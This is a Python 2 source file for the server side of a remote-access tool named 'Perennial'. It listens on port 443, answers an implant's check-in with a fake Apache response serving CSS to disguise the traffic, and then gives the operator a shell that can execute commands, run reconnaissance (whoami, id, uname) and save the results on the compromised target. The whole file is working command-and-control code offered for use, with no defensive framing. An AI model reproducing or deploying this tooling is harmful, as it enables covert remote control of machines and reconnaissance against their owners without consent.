#!/usr/bin/env python

import re
import sys
import base64
import socket
import os.path
import argparse
from datetime import datetime

OUT = 'archive'
SIZE = 1024
PSH_PROMPT = 'psh > '
FAKEOK = """HTTP/1.1 200 OK\r
Date: Tue, 19 Mar 2013 22:12:25 GMT\r
Server: Apache\r
X-Powered-By: PHP/5.3.10-1ubuntu3.2\r
Content-Length: 364\r
Content-Type: text/plain\r
\r
body{background-color:#f0f0f2;margin:0;padding:0;font-family:"Open Sans","Helvetica Neue",Helvetica,Arial,sans-serif}div{width:600px;margin:5em auto;padding:50px;background-color:#fff;border-radius:1em}a:link,a:visited{color:#38488f;text-decoration:none}@media (max-width:700px){body{background-color:#fff}div{width:auto;margin:0 auto;border-radius:0;padding:1em}}"""


def get_args():
    """ Parse arguments and return dictionary. """

    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port')
    return parser.parse_args()


def ctrl_shell_server(s, PORT):
    cmds = ['exit', 'help', 'exec', 'recon', 'shell']
    print '[+] ({}) Entering control shell'.format(datetime.now())
    conn, addr = s.accept()
    prompt = ctrl_shell_exchange(conn, 'getprompt')
    print 'Welcome to psh, the perennial shell!'
    print 'Running `help\' will give you a list of supported commands.'
    while True:
        try:
            inp = raw_input(PSH_PROMPT)
            if inp == '':
                continue
            # exit
            elif inp == cmds[0]:
                break
            # help
            elif inp.split()[0] == cmds[1]:
                print 'Commands:'
                for cmd in cmds:
                    print '  {}'.format(cmd)
            # exec
            elif inp.split()[0] == cmds[2]:
                if re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                    print ctrl_shell_exchange(conn, inp)
                else:
                    print 'Execute commands on target.'
                    print 'usage: exec "cmd1" ["cmd2" "cmd3" ...]'
                    print '\nNote: If the command isn\'t found on target (via `which\'), it will be discarded to make less noise.'
            # recon
            elif inp.split()[0] == cmds[3]:
                if re.search('^recon( -o)?$', inp):
                    response = ctrl_shell_exchange(conn, inp.split()[0])
                    print response
                    if '-o' in inp:
                        ctrl_shell_recon_write(response, OUT)
                else:
                    print 'Basic reconaissance of target.'
                    print 'usage: recon [-h] [-o]'
                    print '\nExecutes, whoami, id, w, who -a, uname -a, and lsb_release -a on target where applicable.'
                    print '\noptions:'
                    print '-h\t\tshow help'
                    print '-o\t\twrite results to file in {}/'.format(OUT)
            # shell
            elif inp.split()[0] == cmds[4]:
                if inp == 'shell':
                    ctrl_shell_shell(conn, prompt)
                else:
                    print 'Basic shell on target (forwards stdout of commands executed).'
                    print 'usage: shell [-h]'
                    print '\noptions:'
                    print '-h\t\tshow help'
            else:
                print 'psh: {}: command not found'.format(inp.split()[0])
        except KeyboardInterrupt:
            print
            continue
        except EOFError:
            print
            break
    socksend(conn, 'fin')
    print '[+] ({}) Exiting control shell.'.format(datetime.now())


def ctrl_shell_exchange(conn, inp):
    socksend(conn, inp)
    return sockrecv(conn)


def ctrl_shell_recon_write(response, out_dir):
    ts = datetime.now().strftime('%Y%m%d%S%f')
    out_ts_dir = '{}/{}'.format(out_dir, ts[:-8])
    outfile = '{}/recon-{}.txt'.format(out_ts_dir, ts)
    if not os.path.isdir(out_dir):
        os.mkdir(out_dir)
    if not os.path.isdir(out_ts_dir):
        os.mkdir(out_ts_dir)
    with open(outfile, 'w') as f:
        f.write(response)
        print 'psh : Recon log written to {}'.format(outfile)


def ctrl_shell_shell(s, prompt):
    pass
    while True:
        try:
            inp = raw_input(PSH_PROMPT + prompt)
            if inp == '':
                continue
            elif inp == 'exit':
                break
            else:
                print ctrl_shell_exchange(s, 'shell {}'.format(inp))
        except KeyboardInterrupt:
            print
            continue
        except EOFError:
            print
            break


def socksend(s, msg):
    """
        Sends message using socket operating under the convention that the
        first five bytes received are the size of the following message.
    """

    pkg = base64.b64encode(msg)
    pkg_size = '{:0>5d}'.format((len(pkg)))
    pkg = pkg_size + pkg
    sent = s.sendall(pkg)
    if sent:
        raise socket.error('socket connection broken')


def sockrecv(s):
    """
        Receives message from socket operating under the convention that the
        first five bytes received are the size of the following message.
        Returns the message.

        TODO: Under high network loads, it's possible that the initial recv
        may not even return the first 5 bytes so another loop is necessary
        to ascertain that.
    """

    chunks = []
    bytes_recvd = 0
    initial = s.recv(SIZE)
    if not initial:
        raise socket.error('socket connection broken')
    msglen, initial = (int(initial[:5]), initial[5:])
    bytes_recvd = len(initial)
    chunks.append(initial)
    while bytes_recvd < msglen:
        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
        if not chunk:
            raise socket.error('socket connection broken')
        chunks.append(chunk)
        bytes_recvd += len(chunk)
    return base64.b64decode(''.join(chunks))


def main():
    args = get_args()
    PORT = int(args.port) if args.port else 443

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', PORT))
    s.listen(1)

    print '[+] Perennial server started on {}.'.format(PORT)
    conn, addr = s.accept()
    print '[i] Connected By: {} at {}'.format(addr, datetime.now())
    ping = conn.recv(SIZE)
    if not ping:
        raise socket.error('socket connection broken')
    if ping.startswith('GET /style.css HTTP/1.1'):
        conn.send(FAKEOK)
        conn.close()
        try:
            ctrl_shell_server(s, PORT)
        except socket.error:
            print '[!] ({}) Socket error.'.format(datetime.now())
            print '[-] ({}) Perennial terminated.'.format(datetime.now())
            sys.exit(0)
    print '[-] ({}) Perennial terminated.'.format(datetime.now())

if __name__ == '__main__':
    main()
